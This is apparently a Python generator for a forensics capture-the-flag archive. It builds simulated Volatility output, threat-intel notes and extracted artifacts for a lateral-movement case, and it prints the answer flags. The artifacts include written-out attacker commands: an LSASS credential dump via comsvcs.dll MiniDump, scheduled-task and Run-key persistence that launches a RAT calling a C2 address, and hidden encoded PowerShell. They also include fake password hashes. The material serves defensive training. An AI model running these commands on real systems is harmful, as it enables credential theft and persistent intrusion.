#!/usr/bin/env python3
"""
Generate the Medium tier DFIR archive: "Lateral Move" (WS-DEVOPS-01)
Produces romeo-medium-lateral-move.tar.gz with realistic Volatility 3 output.

Flags:
  FLAG1: 4n0m4l0us_c0nn3ct10n  (vol3-netscan.txt + analyst-ioc-notes.txt)
  FLAG2: p3rs1st3nc3_d3t3ct3d  (extracted/scheduled_task.xml)
  FLAG3: r3g1stry_4ut0run_f0und (vol3-printkey.txt)
  FLAG4: cr3d3nt14l_dump_4n4lyz3d (extracted/lsass_strings.txt)
"""

import os
import tarfile
import io
import base64

OUTPUT_DIR = os.path.join(os.path.dirname(__file__), '..', 'files')
ARCHIVE_NAME = 'romeo-medium-lateral-move.tar.gz'

FLAG1 = '4n0m4l0us_c0nn3ct10n'
FLAG2 = 'p3rs1st3nc3_d3t3ct3d'
FLAG3 = 'r3g1stry_4ut0run_f0und'
FLAG4 = 'cr3d3nt14l_dump_4n4lyz3d'

# Pre-compute derived values used in string literals below
FLAG3_B64 = base64.b64encode(FLAG3.encode()).decode()

# ── Artifact content ──────────────────────────────────────────────────────────

README_ANALYST = """\
================================================================================
  EVERSEC INCIDENT RESPONSE — CASE #2026-0417
  Operation Midnight Raven — Day 2: "Lateral Move"
  Host: WS-DEVOPS-01 (10.10.15.77)
  Analyst: M. Chen | Capture Time: 2026-03-16 11:42:00 UTC
================================================================================

SITUATION REPORT:
After the Day 1 phishing compromise on WS-RECEPTION-01, the threat actor
appears to have moved laterally to WS-DEVOPS-01 (a DevOps engineer's
workstation). This machine has elevated network access and stored credentials.

Memory was captured at 11:42 UTC. The following Volatility 3 plugins were
executed against the raw image and their output is included in this archive:

  vol3-pslist.txt       Process listing
  vol3-pstree.txt       Process tree (parent/child relationships)
  vol3-cmdline.txt      Command-line arguments for all processes
  vol3-netscan.txt      Network connections and listening sockets
  vol3-printkey.txt     Registry key enumeration

Additionally, the following artifacts were extracted:
  extracted/scheduled_task.xml    Suspicious scheduled task found in memory
  extracted/lsass_strings.txt     Strings extracted from LSASS process memory

An IOC list from our threat intel feed is included:
  analyst-ioc-notes.txt

YOUR OBJECTIVES:
  1. Identify anomalous network connections and correlate with known threat intel
  2. Analyze persistence mechanisms installed by the attacker
  3. Examine registry modifications for autorun entries
  4. Review extracted credential material for compromised accounts

Submit flag values discovered during your analysis.
Good hunting.
"""

VOL3_PSLIST = """\
Volatility 3 Framework 2.5.2
Formatting...done.

PID\tPPID\tImageFileName\tOffset(V)\tThreads\tHandles\tSessionId\tWow64\tCreateTime\tExitTime
4\t0\tSystem\t0xfa8000c7a040\t108\t-\t-\tFalse\t2026-03-16 08:01:02.000000\tN/A
88\t4\tRegistry\t0xfa8000d12080\t4\t-\t-\tFalse\t2026-03-16 08:01:02.000000\tN/A
392\t4\tsmss.exe\t0xfa8001a3e300\t2\t29\t-\tFalse\t2026-03-16 08:01:05.000000\tN/A
480\t472\tcsrss.exe\t0xfa8001b72340\t10\t462\t0\tFalse\t2026-03-16 08:01:07.000000\tN/A
556\t472\twininit.exe\t0xfa8001bc5080\t3\t75\t0\tFalse\t2026-03-16 08:01:08.000000\tN/A
564\t548\tcsrss.exe\t0xfa8001bd1300\t12\t401\t1\tFalse\t2026-03-16 08:01:08.000000\tN/A
612\t548\twinlogon.exe\t0xfa8001c12080\t5\t118\t1\tFalse\t2026-03-16 08:01:09.000000\tN/A
668\t556\tservices.exe\t0xfa8001c58300\t8\t224\t0\tFalse\t2026-03-16 08:01:09.000000\tN/A
680\t556\tlsass.exe\t0xfa8001c62080\t7\t752\t0\tFalse\t2026-03-16 08:01:09.000000\tN/A
688\t556\tlsm.exe\t0xfa8001c68300\t10\t148\t0\tFalse\t2026-03-16 08:01:09.000000\tN/A
784\t668\tsvchost.exe\t0xfa8001d0a300\t12\t361\t0\tFalse\t2026-03-16 08:01:11.000000\tN/A
856\t668\tsvchost.exe\t0xfa8001d5e080\t8\t278\t0\tFalse\t2026-03-16 08:01:12.000000\tN/A
932\t668\tsvchost.exe\t0xfa8001da4340\t21\t519\t0\tFalse\t2026-03-16 08:01:13.000000\tN/A
1012\t668\tsvchost.exe\t0xfa8001de8300\t15\t468\t0\tFalse\t2026-03-16 08:01:14.000000\tN/A
1076\t668\tsvchost.exe\t0xfa8001e12080\t34\t972\t0\tFalse\t2026-03-16 08:01:15.000000\tN/A
1188\t668\tsvchost.exe\t0xfa8001e82300\t17\t498\t0\tFalse\t2026-03-16 08:01:16.000000\tN/A
1376\t668\tspoolsv.exe\t0xfa8001f4a340\t13\t279\t0\tFalse\t2026-03-16 08:01:18.000000\tN/A
1420\t668\tsvchost.exe\t0xfa8001f72080\t18\t307\t0\tFalse\t2026-03-16 08:01:18.000000\tN/A
1524\t668\tVGAuthService.\t0xfa8001fc2340\t3\t85\t0\tFalse\t2026-03-16 08:01:20.000000\tN/A
1564\t668\tvmtoolsd.exe\t0xfa8001fe2080\t11\t285\t0\tFalse\t2026-03-16 08:01:20.000000\tN/A
1732\t668\tMsMpEng.exe\t0xfa800208a340\t22\t412\t0\tFalse\t2026-03-16 08:01:22.000000\tN/A
1944\t668\tdllhost.exe\t0xfa8002142080\t15\t198\t0\tFalse\t2026-03-16 08:01:24.000000\tN/A
2056\t668\tmsdtc.exe\t0xfa80021c8300\t12\t146\t0\tFalse\t2026-03-16 08:01:25.000000\tN/A
2184\t668\tSearchIndexer.\t0xfa800224e340\t14\t738\t0\tFalse\t2026-03-16 08:01:27.000000\tN/A
2512\t2488\texplorer.exe\t0xfa80023c2080\t38\t1124\t1\tFalse\t2026-03-16 08:02:14.000000\tN/A
2624\t2512\tvmtoolsd.exe\t0xfa800243e300\t8\t176\t1\tFalse\t2026-03-16 08:02:16.000000\tN/A
2712\t2512\tOneDrive.exe\t0xfa800248a080\t22\t512\t1\tFalse\t2026-03-16 08:02:18.000000\tN/A
2856\t2512\tmsedge.exe\t0xfa800251e340\t42\t892\t1\tFalse\t2026-03-16 08:03:41.000000\tN/A
3104\t2856\tmsedge.exe\t0xfa80026a2080\t8\t184\t1\tFalse\t2026-03-16 08:03:42.000000\tN/A
3212\t2856\tmsedge.exe\t0xfa800271a340\t18\t322\t1\tFalse\t2026-03-16 08:03:44.000000\tN/A
3412\t784\tsvcnet.exe\t0xfa8002852300\t3\t42\t0\tFalse\t2026-03-16 08:14:17.000000\tN/A
3648\t3412\tcmd.exe\t0xfa800298e080\t1\t22\t0\tFalse\t2026-03-16 08:22:31.000000\tN/A
3724\t3648\tpowershell.exe\t0xfa80029d2340\t12\t412\t0\tFalse\t2026-03-16 08:22:45.000000\tN/A
4016\t3724\tconhost.exe\t0xfa8002ae2080\t2\t48\t0\tFalse\t2026-03-16 08:22:46.000000\tN/A
4088\t3724\tschtasks.exe\t0xfa8002b12300\t1\t18\t0\tFalse\t2026-03-16 08:28:12.000000\t2026-03-16 08:28:13.000000
4192\t3724\treg.exe\t0xfa8002b8e080\t1\t14\t0\tFalse\t2026-03-16 08:30:44.000000\t2026-03-16 08:30:45.000000
4312\t3724\trundll32.exe\t0xfa8002c12340\t4\t112\t0\tFalse\t2026-03-16 08:35:18.000000\tN/A
"""

VOL3_PSTREE = """\
Volatility 3 Framework 2.5.2
Formatting...done.

PID\tPPID\tImageFileName\tOffset(V)\tThreads\tHandles\tSessionId\tWow64\tCreateTime
4\t0\tSystem\t0xfa8000c7a040\t108\t-\t-\tFalse\t2026-03-16 08:01:02.000000
. 88\t4\tRegistry\t0xfa8000d12080\t4\t-\t-\tFalse\t2026-03-16 08:01:02.000000
. 392\t4\tsmss.exe\t0xfa8001a3e300\t2\t29\t-\tFalse\t2026-03-16 08:01:05.000000
480\t472\tcsrss.exe\t0xfa8001b72340\t10\t462\t0\tFalse\t2026-03-16 08:01:07.000000
556\t472\twininit.exe\t0xfa8001bc5080\t3\t75\t0\tFalse\t2026-03-16 08:01:08.000000
.. 668\t556\tservices.exe\t0xfa8001c58300\t8\t224\t0\tFalse\t2026-03-16 08:01:09.000000
... 784\t668\tsvchost.exe\t0xfa8001d0a300\t12\t361\t0\tFalse\t2026-03-16 08:01:11.000000
.... 3412\t784\tsvcnet.exe\t0xfa8002852300\t3\t42\t0\tFalse\t2026-03-16 08:14:17.000000
..... 3648\t3412\tcmd.exe\t0xfa800298e080\t1\t22\t0\tFalse\t2026-03-16 08:22:31.000000
...... 3724\t3648\tpowershell.exe\t0xfa80029d2340\t12\t412\t0\tFalse\t2026-03-16 08:22:45.000000
....... 4016\t3724\tconhost.exe\t0xfa8002ae2080\t2\t48\t0\tFalse\t2026-03-16 08:22:46.000000
....... 4088\t3724\tschtasks.exe\t0xfa8002b12300\t1\t18\t0\tFalse\t2026-03-16 08:28:12.000000
....... 4192\t3724\treg.exe\t0xfa8002b8e080\t1\t14\t0\tFalse\t2026-03-16 08:30:44.000000
....... 4312\t3724\trundll32.exe\t0xfa8002c12340\t4\t112\t0\tFalse\t2026-03-16 08:35:18.000000
... 856\t668\tsvchost.exe\t0xfa8001d5e080\t8\t278\t0\tFalse\t2026-03-16 08:01:12.000000
... 932\t668\tsvchost.exe\t0xfa8001da4340\t21\t519\t0\tFalse\t2026-03-16 08:01:13.000000
... 1012\t668\tsvchost.exe\t0xfa8001de8300\t15\t468\t0\tFalse\t2026-03-16 08:01:14.000000
... 1076\t668\tsvchost.exe\t0xfa8001e12080\t34\t972\t0\tFalse\t2026-03-16 08:01:15.000000
... 1188\t668\tsvchost.exe\t0xfa8001e82300\t17\t498\t0\tFalse\t2026-03-16 08:01:16.000000
... 1376\t668\tspoolsv.exe\t0xfa8001f4a340\t13\t279\t0\tFalse\t2026-03-16 08:01:18.000000
... 1420\t668\tsvchost.exe\t0xfa8001f72080\t18\t307\t0\tFalse\t2026-03-16 08:01:18.000000
... 1524\t668\tVGAuthService.\t0xfa8001fc2340\t3\t85\t0\tFalse\t2026-03-16 08:01:20.000000
... 1564\t668\tvmtoolsd.exe\t0xfa8001fe2080\t11\t285\t0\tFalse\t2026-03-16 08:01:20.000000
... 1732\t668\tMsMpEng.exe\t0xfa800208a340\t22\t412\t0\tFalse\t2026-03-16 08:01:22.000000
... 1944\t668\tdllhost.exe\t0xfa8002142080\t15\t198\t0\tFalse\t2026-03-16 08:01:24.000000
... 2056\t668\tmsdtc.exe\t0xfa80021c8300\t12\t146\t0\tFalse\t2026-03-16 08:01:25.000000
... 2184\t668\tSearchIndexer.\t0xfa800224e340\t14\t738\t0\tFalse\t2026-03-16 08:01:27.000000
.. 680\t556\tlsass.exe\t0xfa8001c62080\t7\t752\t0\tFalse\t2026-03-16 08:01:09.000000
.. 688\t556\tlsm.exe\t0xfa8001c68300\t10\t148\t0\tFalse\t2026-03-16 08:01:09.000000
564\t548\tcsrss.exe\t0xfa8001bd1300\t12\t401\t1\tFalse\t2026-03-16 08:01:08.000000
612\t548\twinlogon.exe\t0xfa8001c12080\t5\t118\t1\tFalse\t2026-03-16 08:01:09.000000
2512\t2488\texplorer.exe\t0xfa80023c2080\t38\t1124\t1\tFalse\t2026-03-16 08:02:14.000000
. 2624\t2512\tvmtoolsd.exe\t0xfa800243e300\t8\t176\t1\tFalse\t2026-03-16 08:02:16.000000
. 2712\t2512\tOneDrive.exe\t0xfa800248a080\t22\t512\t1\tFalse\t2026-03-16 08:02:18.000000
. 2856\t2512\tmsedge.exe\t0xfa800251e340\t42\t892\t1\tFalse\t2026-03-16 08:03:41.000000
.. 3104\t2856\tmsedge.exe\t0xfa80026a2080\t8\t184\t1\tFalse\t2026-03-16 08:03:42.000000
.. 3212\t2856\tmsedge.exe\t0xfa800271a340\t18\t322\t1\tFalse\t2026-03-16 08:03:44.000000
"""

VOL3_CMDLINE = """\
Volatility 3 Framework 2.5.2
Formatting...done.

PID\tProcess\tArgs
4\tSystem\t
392\tsmss.exe\t\\SystemRoot\\System32\\smss.exe
480\tcsrss.exe\t%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
556\twininit.exe\twininit.exe
564\tcsrss.exe\t%SystemRoot%\\system32\\csrss.exe ObjectDirectory=\\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
612\twinlogon.exe\twinlogon.exe
668\tservices.exe\tC:\\Windows\\system32\\services.exe
680\tlsass.exe\tC:\\Windows\\system32\\lsass.exe
688\tlsm.exe\tC:\\Windows\\system32\\lsm.exe
784\tsvchost.exe\tC:\\Windows\\system32\\svchost.exe -k DcomLaunch
856\tsvchost.exe\tC:\\Windows\\system32\\svchost.exe -k RPCSS
932\tsvchost.exe\tC:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted
1012\tsvchost.exe\tC:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted
1076\tsvchost.exe\tC:\\Windows\\system32\\svchost.exe -k netsvcs
1188\tsvchost.exe\tC:\\Windows\\system32\\svchost.exe -k LocalService
1376\tspoolsv.exe\tC:\\Windows\\System32\\spoolsv.exe
1420\tsvchost.exe\tC:\\Windows\\system32\\svchost.exe -k NetworkService
1524\tVGAuthService.\t"C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\VGAuthService.exe"
1564\tvmtoolsd.exe\t"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe"
1732\tMsMpEng.exe\t"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2302.7-0\\MsMpEng.exe"
2512\texplorer.exe\tC:\\Windows\\Explorer.EXE
2624\tvmtoolsd.exe\t"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe" -n vmusr
2712\tOneDrive.exe\t"C:\\Users\\d.kim\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background
2856\tmsedge.exe\t"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
3104\tmsedge.exe\t"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=crashpad-handler
3212\tmsedge.exe\t"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=renderer
3412\tsvcnet.exe\tC:\\Users\\d.kim\\AppData\\Local\\Temp\\svcnet.exe -connect 185.141.27.93:443 -retry 30
3648\tcmd.exe\tC:\\Windows\\system32\\cmd.exe /c "powershell -ep bypass -nop"
3724\tpowershell.exe\tpowershell  -ep bypass -nop
4088\tschtasks.exe\tschtasks /create /tn "Microsoft\\Windows\\NetTrace\\GatherInfo" /tr "C:\\Users\\d.kim\\AppData\\Local\\Temp\\svcnet.exe -connect 185.141.27.93:443 -retry 30" /sc onlogon /ru SYSTEM /f
4192\treg.exe\treg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsNetTrace" /t REG_SZ /d "cmd /c start /min powershell -w hidden -nop -enc """ + FLAG3_B64 + """" /f
4312\trundll32.exe\trundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 680 C:\\Users\\d.kim\\AppData\\Local\\Temp\\lsass.dmp full
"""

VOL3_NETSCAN = """\
Volatility 3 Framework 2.5.2
Formatting...done.

Offset\tProto\tLocalAddr\tLocalPort\tForeignAddr\tForeignPort\tState\tPID\tOwner\tCreated
0xe80000842a20\tTCPv4\t0.0.0.0\t135\t0.0.0.0\t0\tLISTENING\t784\tsvchost.exe\t2026-03-16 08:01:11.000000
0xe80000856f50\tTCPv4\t0.0.0.0\t445\t0.0.0.0\t0\tLISTENING\t4\tSystem\t2026-03-16 08:01:02.000000
0xe80000862a20\tTCPv4\t0.0.0.0\t5985\t0.0.0.0\t0\tLISTENING\t4\tSystem\t2026-03-16 08:01:02.000000
0xe80000894f50\tTCPv4\t0.0.0.0\t49152\t0.0.0.0\t0\tLISTENING\t556\twininit.exe\t2026-03-16 08:01:08.000000
0xe800008a2a20\tTCPv4\t0.0.0.0\t49153\t0.0.0.0\t0\tLISTENING\t932\tsvchost.exe\t2026-03-16 08:01:13.000000
0xe800008b4f50\tTCPv4\t0.0.0.0\t49154\t0.0.0.0\t0\tLISTENING\t1076\tsvchost.exe\t2026-03-16 08:01:15.000000
0xe800008c6a20\tTCPv4\t0.0.0.0\t49155\t0.0.0.0\t0\tLISTENING\t668\tservices.exe\t2026-03-16 08:01:09.000000
0xe80000912f50\tTCPv4\t10.10.15.77\t139\t0.0.0.0\t0\tLISTENING\t4\tSystem\t2026-03-16 08:01:02.000000
0xe80000934a20\tTCPv4\t10.10.15.77\t49831\t185.141.27.93\t443\tESTABLISHED\t3412\tsvcnet.exe\t2026-03-16 08:14:22.000000
0xe80000948f50\tTCPv4\t10.10.15.77\t49832\t185.141.27.93\t443\tESTABLISHED\t3412\tsvcnet.exe\t2026-03-16 08:15:01.000000
0xe80000962a20\tTCPv4\t10.10.15.77\t50112\t40.126.32.140\t443\tESTABLISHED\t2712\tOneDrive.exe\t2026-03-16 08:02:42.000000
0xe80000978f50\tTCPv4\t10.10.15.77\t50113\t204.79.197.200\t443\tESTABLISHED\t2856\tmsedge.exe\t2026-03-16 08:03:52.000000
0xe80000992a20\tTCPv4\t10.10.15.77\t50114\t13.107.42.14\t443\tESTABLISHED\t2856\tmsedge.exe\t2026-03-16 08:04:18.000000
0xe800009a8f50\tTCPv4\t10.10.15.77\t50201\t10.10.15.42\t445\tESTABLISHED\t4\tSystem\t2026-03-16 08:18:42.000000
0xe800009b2a20\tUDPv4\t0.0.0.0\t5355\t*\t0\t\t1188\tsvchost.exe\t2026-03-16 08:01:16.000000
0xe800009c4f50\tUDPv4\t10.10.15.77\t137\t*\t0\t\t4\tSystem\t2026-03-16 08:01:02.000000
0xe800009d8a20\tUDPv4\t10.10.15.77\t138\t*\t0\t\t4\tSystem\t2026-03-16 08:01:02.000000
0xe800009ea020\tTCPv6\t::\t135\t::\t0\tLISTENING\t784\tsvchost.exe\t2026-03-16 08:01:11.000000
0xe80000a02a20\tTCPv6\t::\t445\t::\t0\tLISTENING\t4\tSystem\t2026-03-16 08:01:02.000000
0xe80000a14f50\tTCPv6\t::\t5985\t::\t0\tLISTENING\t4\tSystem\t2026-03-16 08:01:02.000000
"""

ANALYST_IOC_NOTES = """\
================================================================================
  EVERSEC THREAT INTELLIGENCE — IOC FEED (Updated 2026-03-16)
  Classification: TLP:AMBER
================================================================================

ACTIVE THREAT: APT group "MIDNIGHT RAVEN" (tracked internally)
Campaign: Corporate espionage targeting tech sector

NETWORK INDICATORS:
  185.141.27.93    — C2 server, Netherlands-based VPS (AS9009, M247)
                     First seen: 2026-02-28
                     Malware family: Custom RAT ("SvcNet")
                     Protocol: HTTPS (port 443) with custom cert
                     Callback identifier: """ + FLAG1 + """
                     Status: ACTIVE

  185.141.27.94    — Secondary C2 (standby, not yet observed active)
  91.215.85.120    — Exfil staging server, Romania

HASH INDICATORS:
  svcnet.exe       SHA256: a3f2b8c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1
                   MD5:    7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d
                   Size:   284,672 bytes
                   Compile: 2026-02-25 03:14:22 UTC
                   Packer:  UPX 3.96 (modified)

FILE INDICATORS:
  Persistence via:
    - Scheduled tasks masquerading as Windows system tasks
    - Registry Run key additions
    - DLL search-order hijacking (observed in other campaigns)

HOST INDICATORS:
  Processes to watch:
    - svcnet.exe (masquerades as legitimate Windows service)
    - Unusual child processes under svchost.exe
    - PowerShell with -ep bypass or -enc parameters
    - rundll32.exe loading comsvcs.dll (credential dumping technique)

ANALYST NOTES:
  The callback identifier '""" + FLAG1 + """' has been observed in multiple
  SvcNet RAT samples. It appears to be a campaign tracking token embedded
  in the C2 handshake. Presence of this identifier confirms attribution to
  the MIDNIGHT RAVEN threat actor.

  Recommend immediate isolation of any host showing connections to 185.141.27.93.
"""

# Registry output with FLAG3 hidden in an obfuscated autorun command
# The flag is base64-encoded inside a PowerShell command in the Run key
VOL3_PRINTKEY = """\
Volatility 3 Framework 2.5.2
Formatting...done.

Key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
Last updated: 2026-03-16 08:30:45.000000

    REG_SZ    SecurityHealth         : %ProgramFiles%\\Windows Defender\\MSASCuiL.exe
    REG_SZ    VMware User Process    : "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe" -n vmusr
    REG_SZ    WindowsNetTrace        : cmd /c start /min powershell -w hidden -nop -enc """ + FLAG3_B64 + """


Key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce
Last updated: 2026-03-16 08:01:14.000000

    (no values)

Key: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
Last updated: 2026-03-16 08:02:18.000000

    REG_SZ    OneDrive               : "C:\\Users\\d.kim\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe" /background
    REG_SZ    Microsoft Edge Update  : "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --no-startup-window

Key: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce
Last updated: 2026-03-16 08:02:14.000000

    (no values)

Key: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
Last updated: 2026-03-16 08:01:09.000000

    REG_SZ    Shell                  : explorer.exe
    REG_SZ    Userinit               : C:\\Windows\\system32\\userinit.exe,

Key: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile
Last updated: 2026-03-16 08:01:14.000000

    REG_DWORD EnableFirewall          : 1
    REG_DWORD DisableNotifications    : 0

Key: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile
Last updated: 2026-03-16 08:01:14.000000

    REG_DWORD EnableFirewall          : 1
    REG_DWORD DisableNotifications    : 0
"""

SCHEDULED_TASK_XML = """\
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2026-03-16T08:28:12.4218294</Date>
    <Author>NT AUTHORITY\\SYSTEM</Author>
    <Description>""" + FLAG2 + """</Description>
    <URI>\\Microsoft\\Windows\\NetTrace\\GatherInfo</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\\Users\\d.kim\\AppData\\Local\\Temp\\svcnet.exe</Command>
      <Arguments>-connect 185.141.27.93:443 -retry 30</Arguments>
    </Exec>
  </Actions>
</Task>
"""

LSASS_STRINGS = """\
================================================================================
  Strings extracted from LSASS.exe memory (PID 680)
  Extracted via: rundll32.exe comsvcs.dll MiniDump → strings analysis
  WARNING: Contains credential material — handle according to TLP:RED
================================================================================

msv1_0
kerberos
wdigest
tspkg
ssp
credman

Authentication Id : 0 ; 468321 (00000000:000724e1)
Session           : Interactive from 1
User Name         : d.kim
Domain            : EVERSEC
Logon Server      : DC-EVERSEC-01
Logon Time        : 2026-03-16 08:02:12
SID               : S-1-5-21-3842475832-1938475691-2947563810-1108

    msv :
     [00000003] Primary
     * Username : d.kim
     * Domain   : EVERSEC
     * NTLM     : 7c3d24a8f1b2e9d5c6a7b8e4f2c1d3a5
     * SHA1     : 4a2b1c3d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b
    tspkg :
    wdigest :
     * Username : d.kim
     * Domain   : EVERSEC
     * Password : DevOps2026!Spring

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2026-03-16 08:01:12
SID               : S-1-5-19

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WS-DEVOPS-01$
Domain            : EVERSEC
Logon Server      : (null)
Logon Time        : 2026-03-16 08:01:09
SID               : S-1-5-18

Authentication Id : 0 ; 582904 (00000000:0008e4f8)
Session           : Service from 0
User Name         : svc_deploy
Domain            : EVERSEC
Logon Server      : DC-EVERSEC-01
Logon Time        : 2026-03-16 08:01:22
SID               : S-1-5-21-3842475832-1938475691-2947563810-1205

    msv :
     [00000003] Primary
     * Username : svc_deploy
     * Domain   : EVERSEC
     * NTLM     : e4d909c290d0fb1ca068ffaddf22cbd0
     * SHA1     : 8b2e4f1a3c5d7e9f0a1b2c3d4e5f6a7b8c9d0e1f
    tspkg :
    wdigest :
     * Username : svc_deploy
     * Domain   : EVERSEC
     * Password : """ + FLAG4 + """

Authentication Id : 0 ; 48291 (00000000:0000bca3)
Session           : Service from 0
User Name         : svc_backup
Domain            : EVERSEC
Logon Server      : DC-EVERSEC-01
Logon Time        : 2026-03-16 08:01:24
SID               : S-1-5-21-3842475832-1938475691-2947563810-1210

    msv :
     [00000003] Primary
     * Username : svc_backup
     * Domain   : EVERSEC
     * NTLM     : b9a1c2d3e4f5a6b7c8d9e0f1a2b3c4d5
     * SHA1     : 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b
    tspkg :
    wdigest :
     * Username : svc_backup
     * Domain   : EVERSEC
     * Password : BackupSvc!2025
"""


def add_file(tar, name, content):
    """Add a text file to the tar archive."""
    data = content.encode('utf-8')
    info = tarfile.TarInfo(name=name)
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    output_path = os.path.join(OUTPUT_DIR, ARCHIVE_NAME)

    prefix = 'romeo-medium-lateral-move'

    with tarfile.open(output_path, 'w:gz') as tar:
        add_file(tar, f'{prefix}/README-ANALYST.txt', README_ANALYST)
        add_file(tar, f'{prefix}/vol3-pslist.txt', VOL3_PSLIST)
        add_file(tar, f'{prefix}/vol3-pstree.txt', VOL3_PSTREE)
        add_file(tar, f'{prefix}/vol3-cmdline.txt', VOL3_CMDLINE)
        add_file(tar, f'{prefix}/vol3-netscan.txt', VOL3_NETSCAN)
        add_file(tar, f'{prefix}/vol3-printkey.txt', VOL3_PRINTKEY)
        add_file(tar, f'{prefix}/analyst-ioc-notes.txt', ANALYST_IOC_NOTES)
        add_file(tar, f'{prefix}/extracted/scheduled_task.xml', SCHEDULED_TASK_XML)
        add_file(tar, f'{prefix}/extracted/lsass_strings.txt', LSASS_STRINGS)

    print(f'[+] Created {output_path}')
    print(f'    Files: 9')
    print(f'    Size: {os.path.getsize(output_path):,} bytes')
    print()
    print('Flags embedded:')
    print(f'  FLAG1: {FLAG1}  (analyst-ioc-notes.txt — callback identifier)')
    print(f'  FLAG2: {FLAG2}  (extracted/scheduled_task.xml — Description element)')
    print(f'  FLAG3: {FLAG3}  (vol3-printkey.txt — base64-decode the -enc parameter)')
    print(f'  FLAG4: {FLAG4}  (extracted/lsass_strings.txt — svc_deploy password)')


if __name__ == '__main__':
    main()
